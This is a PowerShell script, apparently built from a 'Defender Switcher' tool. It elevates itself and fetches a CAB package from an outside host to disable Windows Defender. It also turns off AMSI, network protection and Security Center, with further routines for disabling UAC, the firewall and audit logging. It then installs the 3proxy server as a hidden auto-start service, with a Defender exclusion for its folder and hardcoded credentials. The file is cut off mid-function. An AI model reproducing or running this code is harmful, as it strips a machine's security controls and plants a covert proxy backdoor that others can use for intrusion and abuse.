param (

    $disable_av

)

$interactiveMode = ($disable_av)



if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {$arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""; Start-Process PowerShell.exe -ArgumentList $arguments -Verb RunAs; exit}

if (![Type]::GetType('Privileges')) {

Add-Type -TypeDefinition @"

using System;

using System.Runtime.InteropServices;

public class Privileges {

    [DllImport("advapi32.dll")] internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

    [DllImport("advapi32.dll")] internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);

    [DllImport("advapi32.dll", SetLastError = true)] internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

    [StructLayout(LayoutKind.Sequential, Pack = 1)] internal struct TokPriv1Luid { public int Count; public long Luid; public int Attr; }

    internal const int SE_PRIVILEGE_ENABLED = 0x00000002, TOKEN_QUERY = 0x00000008, TOKEN_ADJUST_PRIVILEGES = 0x00000020;

    public static bool AddPrivilege(string privilege) {

        IntPtr hproc = GetCurrentProcess(), htok = IntPtr.Zero;

        TokPriv1Luid tp = new TokPriv1Luid { Count = 1, Luid = 0, Attr = SE_PRIVILEGE_ENABLED };

        if (OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok) && LookupPrivilegeValue(null, privilege, ref tp.Luid))

            return AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);

        return false;

    }

    public static bool RemovePrivilege(string privilege) {

        IntPtr hproc = GetCurrentProcess(), htok = IntPtr.Zero;

        TokPriv1Luid tp = new TokPriv1Luid { Count = 1, Luid = 0, Attr = 0 };

        if (OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok) && LookupPrivilegeValue(null, privilege, ref tp.Luid))

            return AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);

        return false;

    }

    [DllImport("kernel32.dll")] public static extern IntPtr GetCurrentProcess();

}

"@ -Language CSharp

}

function Add-Privileges {'SeRestorePrivilege','SeTakeOwnershipPrivilege','SeDebugPrivilege','SeSystemEnvironmentPrivilege' | ForEach-Object {[Privileges]::AddPrivilege($_) | Out-Null }}

function Remove-Privileges {'SeRestorePrivilege','SeTakeOwnershipPrivilege','SeDebugPrivilege','SeSystemEnvironmentPrivilege' | ForEach-Object {[Privileges]::RemovePrivilege($_) | Out-Null }}



Add-Type -TypeDefinition @"

using System;

using System.Runtime.InteropServices;

public class ConsoleManager {

    [DllImport("kernel32.dll")]

    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]

    public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

    [DllImport("kernel32.dll")]

    public static extern IntPtr GetStdHandle(int nStdHandle);

    [DllImport("kernel32.dll")]

    public static extern bool SetCurrentConsoleFontEx(IntPtr hConsoleOutput, bool bMaximumWindow, ref CONSOLE_FONT_INFO_EX lpConsoleCurrentFontEx);

    [DllImport("kernel32.dll")]

    public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);

    [DllImport("kernel32.dll")]

    public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);

    [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]

    public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]

    public struct CONSOLE_FONT_INFO_EX {

        public uint cbSize;

        public uint nFont;

        public COORD dwFontSize;

        public int FontFamily;

        public int FontWeight;

        [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)]

        public string FaceName;

    }

    [StructLayout(LayoutKind.Sequential)]

    public struct COORD { public short X; public short Y; }

    [StructLayout(LayoutKind.Sequential)]

    public struct RECT { public int Left; public int Top; public int Right; public int Bottom; }

    public const int STD_OUTPUT_HANDLE = -11;

    public static void ResizeWindow(int w, int h) {

        MoveWindow(GetConsoleWindow(), 0, 0, w, h, true);

    }

    public static void SetConsoleFont(string name, short size) {

        CONSOLE_FONT_INFO_EX info = new CONSOLE_FONT_INFO_EX();

        info.cbSize = (uint)Marshal.SizeOf(typeof(CONSOLE_FONT_INFO_EX));

        info.FaceName = name;

        info.dwFontSize = new COORD { X = size, Y = size };

        info.FontFamily = 54;

        info.FontWeight = 400;

        SetCurrentConsoleFontEx(GetStdHandle(STD_OUTPUT_HANDLE), false, ref info);

    }

    public static void QuickEditOFF() {

        IntPtr hConIn = GetStdHandle(-10);

        uint m;

        if (GetConsoleMode(hConIn, out m))

            SetConsoleMode(hConIn, (m | 0x80U) & ~0x40U);

    }

}

"@



function CheckDefenderStatus {

    $packageResult = (Get-WindowsPackage -online | Where-Object { $_.PackageName -like '*AntiBlocker*' })

    $serviceResult = (Get-Service -Name WinDefend -ErrorAction SilentlyContinue | Select-Object -ExpandProperty StartType)

    $serviceResult = $serviceResult -replace "`r`n", ""



    if ($packageResult -or $serviceResult -eq 'Disabled') {

        $global:status = "disabled"

    } else {

        $global:status = "enabled"

    }

}



$pingResult = & ping -n 2 google.com | Select-String "TTL="

$existingFile = if (Test-Path "$env:WinDir\DefenderSwitcher") {gci -Path "$env:WinDir\DefenderSwitcher" -Filter "*AntiBlocker*" -File | Select-Object -First 1} else {$null}

$programUsable = $false



switch ($true) {

    ($null -eq $existingFile) {

        if (!$pingResult) {

            $programUsable = $false

        } else {

            $destinationDir = "$env:WinDir\DefenderSwitcher"

            $fileName = "Z-RapidOS-AntiBlocker-Package31bf3856ad364e35amd641.0.0.0.cab"

            $destinationPath = Join-Path -Path $destinationDir -ChildPath $fileName

            $fileUrl = "https://rapid-community.ru/downloads/$fileName"



            if (!(Test-Path -Path $destinationDir)) {

                New-Item -Path $destinationDir -ItemType Directory | Out-Null

            }



            curl.exe -s -o $destinationPath $fileUrl > $null 2>&1



            if (Test-Path -Path $destinationPath) {

                $programUsable = $true

            } else {

                $programUsable = $false

            }

        }

        break

    }

    default {

        $programUsable = $true

        $destinationDir = "$env:WinDir\DefenderSwitcher"

        $fileName = "Z-RapidOS-AntiBlocker-Package31bf3856ad364e35amd641.0.0.0.cab"

        $destinationPath = Join-Path -Path $destinationDir -ChildPath $fileName

        $fileUrl = "https://rapid-community.ru/downloads/$fileName"



        $tempFile = Join-Path -Path $env:TEMP -ChildPath $fileName

        curl.exe -s -o $tempFile $fileUrl > $null 2>&1



        if ((Test-Path -Path $tempFile) -and (Test-Path -Path $destinationPath)) {

            if ((Get-FileHash -Path $tempFile).Hash -ne (Get-FileHash -Path $destinationPath).Hash) {

                Move-Item -Path $tempFile -Destination $destinationPath -Force

            } else {

                Remove-Item -Path $tempFile

            }

        }

        break

    }

}



function EnableDefender {

    cls

    CheckDefenderStatus;

    switch ($status) {

        "enabled" {

            $host.UI.RawUI.ForegroundColor = 'Green'; Write-Host -NoNewline "["; Write-Host -NoNewline "INFO"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Defender is already enabled."

        }

        default {

            $host.UI.RawUI.ForegroundColor = 'Green'; Write-Host -NoNewline "["; Write-Host -NoNewline "PROCESSING"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Enabling Defender..."

            

            Add-Privileges

            $ProgressPreference = 'SilentlyContinue'; $WarningPreference = 'SilentlyContinue';

            Get-WindowsPackage -Online | Where-Object { $_.PackageName -like '*AntiBlocker*' } | ForEach-Object {

                Remove-WindowsPackage -Online -PackageName $_.PackageName -NoRestart

            } | Out-Null 2>&1

            $ProgressPreference = 'Continue'; $WarningPreference = 'Continue';

            Remove-Privileges



            CheckDefenderStatus;

            switch ($status) {

                "enabled" {

                    $host.UI.RawUI.ForegroundColor = 'Green'; Write-Host -NoNewline "["; Write-Host -NoNewline "INFO"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Defender has been enabled."

                }

                default {

                    $host.UI.RawUI.ForegroundColor = 'Red'; Write-Host -NoNewline "["; Write-Host -NoNewline "ERROR"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Failed to enable Defender."

                    Write-Host ""

                }

            }

        }

    }

    if ($interactiveMode) {

        pause

        MainMenu

    } else {

        exit

    }

}



function DisableDefender {

    cls

	Write-Host "Try..."

    CheckDefenderStatus;

    switch ($status) {

        "disabled" {

            $host.UI.RawUI.ForegroundColor = 'Green'; Write-Host -NoNewline "["; Write-Host -NoNewline "INFO"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Defender is already disabled."

        }

        default {

            if ($programUsable -eq $true) {

                $host.UI.RawUI.ForegroundColor = 'Green'; Write-Host -NoNewline "["; Write-Host -NoNewline "PROCESSING"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Disabling Defender..."

                

                Add-Privileges

				Disable-Security-Center-Windows

                ProcessDefender -InstallCAB $true

                ProcessDefender -LinkManifests $true

                Disable-Defender-Notifications

				Disable-Security-Center

                #Configure-LocalGroupPolicy

				Disable-AMSI

				#ChangeGroupPolic

                #Disable-WindowsDefender

                #Disable-WindowsDefender-Reg

				Disable-NetworkProtection

                #Disable-UAC

                #Disable-Firewall

                #Disable-TamperProtection               

                Remove-Privileges

                CheckDefenderStatus;

                #Pause

                switch ($status) {

                    "disabled" {

                        $host.UI.RawUI.ForegroundColor = 'Green'; Write-Host -NoNewline "["; Write-Host -NoNewline "INFO"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Defender has been disabled."

                        #Pause

                    }

                    default {

                        $host.UI.RawUI.ForegroundColor = 'Red'; Write-Host -NoNewline "["; Write-Host -NoNewline "ERROR"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Failed to disable Defender."

                        #Pause

                        Write-Host ""

                    }

                }

            } else {

                $host.UI.RawUI.ForegroundColor = 'Red'; Write-Host -NoNewline "["; Write-Host -NoNewline "ERROR"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Connect to the internet and restart Defender Switcher to proceed." 

                #Pause

            }

        }

    }

    if ($interactiveMode) {

        #pause

        MainMenu

    } else {

        exit

    }

}



function ProcessDefender {

    param (

        [switch]$InstallCAB,

        [switch]$LinkManifests

    )

 

    if ($InstallCAB) {

        $cabPath = gci -Path "$env:WinDir\DefenderSwitcher" -Filter "*AntiBlocker*" -File | Select-Object -First 1



        if (!$cabPath) {

            $host.UI.RawUI.ForegroundColor = 'Red'; Write-Host -NoNewline "["; Write-Host -NoNewline "ERROR"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Connect to the internet and restart Defender Switcher to proceed." 

            return

        }



        $filePath = $cabPath.FullName

    

        $host.UI.RawUI.ForegroundColor = 'Green'; Write-Host -NoNewline "["; Write-Host -NoNewline "INFO"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Checking certificate..."

        try {       

            $cert = (Get-AuthenticodeSignature $filePath).SignerCertificate

            if ($cert.Extensions.EnhancedKeyUsages.Value -ne "1.3.6.1.4.1.311.10.3.6") {

                $host.UI.RawUI.ForegroundColor = 'Red'; Write-Host -NoNewline "["; Write-Host -NoNewline "ERROR"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Cert doesn't have proper key usages, can't continue."

                return

            }



            $certRegPath = "HKLM:\Software\Microsoft\SystemCertificates\ROOT\Certificates\8A334AA8052DD244A647306A76B8178FA215F344"

            if (!(Test-Path "$certRegPath")) {

                New-Item -Path $certRegPath -Force | Out-Null

            }

        } catch {

            $host.UI.RawUI.ForegroundColor = 'Red'; Write-Host -NoNewline "["; Write-Host -NoNewline "ERROR"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Cert error from '$filePath': $_"

            return

        }

    

        $host.UI.RawUI.ForegroundColor = 'Green'; Write-Host -NoNewline "["; Write-Host -NoNewline "INFO"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Adding package..."

        try {

            $ProgressPreference = 'SilentlyContinue'

            Add-WindowsPackage -Online -PackagePath $filePath -NoRestart -IgnoreCheck -LogLevel 1 *>$null

            $ProgressPreference = 'Continue'

        } catch {

            $host.UI.RawUI.ForegroundColor = 'Red'; Write-Host -NoNewline "["; Write-Host -NoNewline "ERROR"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Error when adding package '$filePath': $_"

            $host.UI.RawUI.ForegroundColor = 'Yellow'; Write-Host -NoNewline "["; Write-Host -NoNewline "WARN"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Attempting to use DISM to install the package..."

            try {

                $ProgressPreference = 'SilentlyContinue'

                DISM /Online /Add-Package /PackagePath:$filePath /NoRestart *>$null

                $ProgressPreference = 'Continue'

            } catch {return}

        }

    }



    if ($LinkManifests) { 

        CheckDefenderStatus;

        if ($status -eq "disabled") {

            $version = '38655.38527.65535.65535'

        	$srcPathExpanded = [System.Environment]::ExpandEnvironmentVariables("%WinDir%\DefenderSwitcher\WinSxS")



            $host.UI.RawUI.ForegroundColor = 'Green'; Write-Host -NoNewline "["; Write-Host -NoNewline "INFO"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Getting manifests..."

        	$manifests = gci "$env:WinDir\WinSxS\Manifests" -File -Filter "*$version*"

        	if ($manifests.Count -eq 0) {

                $host.UI.RawUI.ForegroundColor = 'Red'; Write-Host -NoNewline "["; Write-Host -NoNewline "ERROR"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "No manifests found! Can't create repair source."

	        	return

	        }



	        if (Test-Path $srcPathExpanded -PathType Container) {

                $host.UI.RawUI.ForegroundColor = 'Green'; Write-Host -NoNewline "["; Write-Host -NoNewline "INFO"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Deleting old RepairSrc..."

	        	Remove-Item $srcPathExpanded -Force -Recurse

	        }

            $host.UI.RawUI.ForegroundColor = 'Green'; Write-Host -NoNewline "["; Write-Host -NoNewline "INFO"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Creating RepairSrc path..."

	        New-Item "$srcPathExpanded\Manifests" -Force -ItemType Directory | Out-Null



            $host.UI.RawUI.ForegroundColor = 'Green'; Write-Host -NoNewline "["; Write-Host -NoNewline "INFO"; Write-Host -NoNewline "] "; $host.UI.RawUI.ForegroundColor = 'White'; Write-Host "Hard linking manifests..."

            foreach ($manifest in $manifests) {

	        	New-Item -ItemType HardLink -Path "$srcPathExpanded\Manifests\$manifest" -Target $manifest.FullName | Out-Null

	        }



	        $servicingPolicyKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Servicing"

	        if (!(Test-Path $servicingPolicyKey)) { New-Item -Path $servicingPolicyKey -Force | Out-Null }

	        Set-ItemProperty -Path $servicingPolicyKey -Name LocalSourcePath -Value "%WinDir%\DefenderSwitcher\WinSxS" -Type ExpandString -Force

        }

    }

}



function ExitProgram {

    Start-Sleep -Seconds 1

    exit

}



function Disable-TamperProtection {

    $tamperPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"

    try {

        if (-not (Test-Path $tamperPath)) {

            New-Item -Path $tamperPath -Force | Out-Null

        }

        Set-ItemProperty -Path $tamperPath -Name "TamperProtection" -Value 0 -PropertyType DWord -Force

        Write-Host "Tamper Protection has been disabled."

    } catch {

        Write-Host "Failed to disable Tamper Protection: $_"

    }

}

function Disable-UAC {

    try {

        $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"

        Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0 -Type DWord -Force

        Write-Host "UAC has been disabled."

    } catch {

        Write-Host "Failed to disable UAC: $_"

    }

}

function Disable-Firewall {

    try {

        Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False

        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" `

                         -Name "EnableFirewall" -Value 0 -Type DWord -Force

        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile" `

                         -Name "EnableFirewall" -Value 0 -Type DWord -Force

        Write-Host "Firewall has been disabled."

    } catch {

        Write-Host "Failed to disable Firewall: $_"

    }

}

function Disable-NetworkProtection {

    try {

        Set-MpPreference -EnableNetworkProtection Disabled

        Write-Host "Network Protection has been disabled."

    } catch {

        Write-Host "Failed to disable Network Protection: $_"

    }

}

function Disable-WindowsDefender {

    try {

        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

        Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue

        Set-MpPreference -DisableAutoExclusions $true -ErrorAction SilentlyContinue

        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue

        Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue

        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue

        Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue

        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue

        Set-MpPreference -DisableOnAccessProtection $true -ErrorAction SilentlyContinue

        Set-MpPreference -DisableScanOnRealtimeEnable $true -ErrorAction SilentlyContinue



        $defenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"

        if (-not (Test-Path $defenderPath)) {

            New-Item -Path $defenderPath -Force | Out-Null

        }

        Set-ItemProperty -Path $defenderPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force

        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend" -Name "Start" -Value 4 -Type DWord -Force



        Write-Host "Windows Defender has been disabled."

    } catch {

        Write-Host "Failed to disable Windows Defender: $_" 

      }



}

function Disable-DefenderRegistry {

    param (

        [string]$Path,

        [string]$Name,

        [int]$Value

    )



        if (-not (Test-Path $Path)) {

            New-Item -Path $Path -Force | Out-Null

            Write-Host "Created registry path: $Path"

        }



        if (-not (Get-ItemProperty -Path $Path -Name $Name -ErrorAction SilentlyContinue)) {

            New-ItemProperty -Path $Path -Name $Name -Value $Value -PropertyType DWord -Force | Out-Null

            Write-Host "Created and disabled registry property: $Path\$Name"

        } else {

            Set-ItemProperty -Path $Path -Name $Name -Value $Value -Type DWord -Force

            Write-Host "Disabled registry property: $Path\$Name"

        }

        catch {

        Write-Host "Failed to modify registry: $_"

      }

    } 

function Disable-WindowsDefender-Reg {

    try {

        # Отключение основных функций Windows Defender

        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1

        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutinelyTakingAction" -Value 1

        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Microsoft\Windows Security Health\State" -Name "WindowsSecurityHealthState" -Value 0

        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1

        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1

        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0

        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1

        Disable-DefenderRegistry -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1



        # Отключение службы Windows Defender

        Disable-DefenderRegistry -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend" -Name "Start" -Value 4



        # Отключение блокировки уязвимых драйверов

        Disable-DefenderRegistry -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Config\Default" -Name "VulnerableDriverBlocklistEnable" -Value 0



        Write-Host "Windows Defender has been fully disabled via registry."

    } catch {

        Write-Host "Failed to disable Windows Defender: $_"

    }

}

function Disable-AMSI {

    try {

        $amsiPath = "HKLM:\SOFTWARE\Microsoft\AMSI"

        if (-not (Test-Path $amsiPath)) {

            New-Item -Path $amsiPath -Force | Out-Null

        }

        Set-ItemProperty -Path $amsiPath -Name "Disabled" -Value 1 -Type DWord -Force

        Write-Host "AMSI has been disabled."

    } catch {

        Write-Host "Failed to disable AMSI: $_"

      }



}

function Configure-LocalGroupPolicy {

    try {

        secedit /export /cfg c:\secpol.cfg

        (Get-Content c:\secpol.cfg) -replace "DriverLoadPolicy = 3", "DriverLoadPolicy = 0" | Set-Content c:\secpol.cfg

        secedit /configure /db c:\windows\security\local.sdb /cfg c:\secpol.cfg /areas SECURITYPOLICY

        Remove-Item c:\secpol.cfg



        auditpol /set /category:* /success:disable /failure:disable

        Write-Host "Local Group Policy has been configured."

    } catch {

        Write-Host "Failed to configure Group Policy: $_"

    }

}

function ChangeGroupPolicy {

    try {

        $executionPolicy = "Bypass"



        $machinePolicyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"

        $userPolicyPath = "HKCU:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"



        if (-not (Test-Path $machinePolicyPath)) {

            New-Item -Path $machinePolicyPath -Force | Out-Null

        }

        Set-ItemProperty -Path $machinePolicyPath -Name "ExecutionPolicy" -Value $executionPolicy -Force



        if (-not (Test-Path $userPolicyPath)) {

            New-Item -Path $userPolicyPath -Force | Out-Null

        }

        Set-ItemProperty -Path $userPolicyPath -Name "ExecutionPolicy" -Value $executionPolicy -Force



        Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy $executionPolicy -Force

        Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy $executionPolicy -Force

        Set-ExecutionPolicy -Scope Process -ExecutionPolicy $executionPolicy -Force



    } catch {

        Write-Host "failed"

    }

}

function Disable-Defender-Notifications {

    try {

        $securityCenterPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications"

        if (-not (Test-Path $securityCenterPath)) {

            New-Item -Path $securityCenterPath -Force | Out-Null

        }

        Set-ItemProperty -Path $securityCenterPath -Name "DisableEnhancedNotifications" -Value 1 -Type DWord -Force

        Write-Host "Windows Defender Notifications has been disabled."

    } catch {

        Write-Host "Failed to disabled Defender Notifications: $_"

    }

}

function Disable-Security-Center {

    try {

        $securityCenterPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Defender Security Center\Notifications"

        if (-not (Test-Path $securityCenterPath)) {

            New-Item -Path $securityCenterPath -Force | Out-Null

        }

        Set-ItemProperty -Path $securityCenterPath -Name "DisableNotifications" -Value 1 -Type DWord -Force

        #Stop-Service -Name SecurityHealthService -Force

        #Set-Service -Name SecurityHealthService -StartupType Disabled

        Write-Host "Windows Security Center has been disabled."

    } catch {

        Write-Host "Failed to disable Security Center: $_"

    }

}

function Disable-Security-Center-Windows {

    try {

        $securityCenterPath = "HKCU:\Software\Policies\Microsoft\Windows\Explorer"

        if (-not (Test-Path $securityCenterPath)) {

            #New-Item -Path $securityCenterPath -Force | Out-Null

			New-Item –Path "HKCU:\Software\Policies\Microsoft\Windows" –Name Explorer

			Write-Host "Good!" 

        }

		

        Set-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Explorer" -Name "DisableNotificationCenter" -Value 1 -Type DWord -Force

        #Stop-Service -Name SecurityHealthService -Force

        #Set-Service -Name SecurityHealthService -StartupType Disabled

        Write-Host "Windows UAC Security Center has been disabled."

    } catch {

        Write-Host "Failed to disable UAC Security Center: $_"

    }

}

function Install-proxy {

    try {
        $ip_int = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
        $user = (Get-ChildItem Env:USERNAME).Value

        #$path_dir = 'C:\Users\'+ $user + '\AppData\Local'
		$path_dir = 'C:\ProgramData'
		
		$path_s = $path_dir + "\3proxy"

		New-Item -ItemType "directory" -Path $path_s

		Add-MpPreference -ExclusionPath $path_s

        $download_url = "https://github.com/3proxy/3proxy/releases/download/0.9.5/3proxy-0.9.5-lite.zip"

		$local_path = $path_s + "\3proxy-0.9.5-lite.zip" 

		$WebClient = New-Object System.Net.WebClient

		$WebClient.DownloadFile($download_url, $local_path)

		$path_arch = $path_s + "\3proxy-0.9.5-lite.zip"


		Expand-Archive $path_arch -DestinationPath $path_s


		$path_bin = $path_s + "\bin"
		
		#$cm = "icacls " + $path_bin + " /grant " + $user + ":F" + " /t"

		#$cm = "icacls " + $path_bin + " /grant " + $path_dir + ":F" + " /t"

		#$result = cmd /c $cm #даем права


		$path_file = $path_bin + "\3proxy.cfg "
		
		$ext = "external " + $ip_int
		$intt = "internal " + $ip_int
		$den = "deny * * " + $ip_int
		#$lg = "log C:\Users\" + $user + "\AppData\Local\3proxy\bin\3proxy.log D"
		$lg = "log C:\ProgramData\3proxy\bin\3proxy.log D"

		$fd = ("service","nserver 8.8.8.8","nscache 65536","timeouts 1 5 30 60 180 1800 15 60","users test:CL:87654321",
		       $lg,"rotate 7","auth strong","allow test",$ext,$intt,"deny * * 127.0.0.1",$den,"proxy -n","maxconn 32").Trim()

		$fd | Out-File -Encoding "Default" -FilePath $path_file
		
		$ex_path = $path_bin + '\3proxy.exe'
		
		#$cm ="sc create 3proxy binpath= "\"C:\Users\Admin\AppData\Local\3proxy\bin\3proxy.exe\" + $path_file + " --service " +  "DisplayName= " + '"3proxy tiny proxy server"' + " start= auto"
		#$cm = sc create 3proxy binpath= "\"C:\Users\Admin\AppData\Local\3proxy\bin\3proxy.exe\" \"C:\Users\Admin\AppData\Local\3proxy\bin\3proxy.cfg\" --service " DisplayName= "3proxy tiny proxy server" start= auto
		
		#$cm = "sc.exe create 3proxy binpath= " + "\" + $ex_path \" + "' $path_file'" + " --service" + " DisplayName= " + '"3proxy tiny proxy server"' + " start= auto"
		#$cm = sc create 3proxy binpath= "\"C:\ProgramData\3proxy\bin\3proxy.exe\" \"C:\ProgramData\3proxy\bin\3proxy.cfg\" --service " DisplayName= "3proxy tiny proxy server" start= auto
		
		$cm = sc.exe create 3proxy binpath= "\"C:\ProgramData\3proxy\bin\3proxy.exe\" \"C:\ProgramData\3proxy\bin\3proxy.cfg\" --service " DisplayName= "3proxy tiny proxy server" start= auto
	
		Write-Host $cm
		
		$process = Start-Process -Verb RunAs cmd.exe -Args '/c', $cm -PassThru -Wait
		#$process = Start-Process `C:\Windows\System32\ ` -ArgumentList $cm -PassThru -Wait
        $process.ExitCode
		
		Start-Service -Name 3proxy 
		Write-Host "good!"
		
		$st = "Added proxy - Yes"
		$user = (Get-ChildItem Env:USERNAME).Value
        $path_dir = 'C:\Users\'+ $user + '\AppData\Local'
		$Filepath = $path_dir + "\" + $ip_int + ".txt"

		Add-Content -Path $Filepath -Value $st
		
		$ex_path = $path_bin + '\3proxy.exe'
		
		#$cm = "mstsc /v:" + $ip
	    #$cnd = $command + " & " + $cm 
	    #Invoke-Expression -Command "cmd /c $cnd"

    } catch {
		Write-Host "Failed file"
		Write-Host $error[0].Exception
        $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
		$user = (Get-ChildItem Env:USERNAME).Value
        $path_dir = 'C:\Users\'+ $user + '\AppData\Local'
		$Filepath = $path_dir + "\" + $ip + ".txt"
		$st = "Added proxy - No"
		Add-Content -Path $Filepath -Value $st

    }

}

function Add-service {

    try {

        #$securityCenterPath = "HKLM:\SYSTEM\CurrentControlSet\Services\3proxy"

        #if (-not (Test-Path $securityCenterPath)) {
            #New-Item -Path $securityCenterPath | Out-Null
        #}

        #Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\3proxy" -Name "DisplayName" -Value 3proxy -Type String -Force
        #Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\3proxy" -Name "ErrorControl" -Value 0 -Type DWord -Force
        #Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\3proxy" -Name "ImagePath" -Value "C:\Users\Admin\AppData\Local\3proxy\bin\3proxy.exe" /"C:\Users\Admin\AppData\Local\3proxy\bin\3proxy.cfg" --service -Type String -Force
        #Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\3proxy" -Name "ObjectName" -Value LocalSystem -Type String -Force
        #Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\3proxy" -Name "Start" -Value 2 -Type DWord -Force
        #Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\3proxy" -Name "Type" -Value 16 -Type DWord -Force
        #Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\3proxy" -Name "WOW64" -Value 332 -Type DWord -Force
        
		New-Service -Name 3proxy -BinaryPathName "C:\Users\Admin\AppData\Local\bin\3proxy.exe""C:\Users\Admin\AppData\Local\bin\3proxy.cfg" --service -DisplayName "3proxyserver" -Description "3proxy run"
		
        Start-Service -Name 3proxy 
		Write-Host "good!"

